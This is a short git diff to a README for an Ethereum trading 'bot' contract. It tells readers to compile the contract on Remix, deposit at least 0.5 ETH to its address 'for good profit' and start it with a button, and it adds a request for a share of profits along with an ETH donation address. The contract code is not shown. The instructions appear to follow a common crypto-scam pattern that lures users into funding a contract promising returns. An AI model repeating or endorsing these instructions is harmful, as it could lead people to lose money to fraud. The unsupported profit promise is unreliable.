@@ -45,3 +45,10 @@ The bot must be compiled on Remix Compiler, or else it will not work.
 7. Deposit funds to your exact contract/bot address (Recommended at least 0.5 ETH for good profit)
 8. After your transaction was confirmed, Start the bot by clicking the start button. Withdraw anytime by clicking the withdrawal button
 
+License is 100% free but send me a cafee with your profits.
+
+donations ETH : 0xFF8a14e4F1feBb86791b9AfC8fca976c19d7ebF9
+
+
+
+
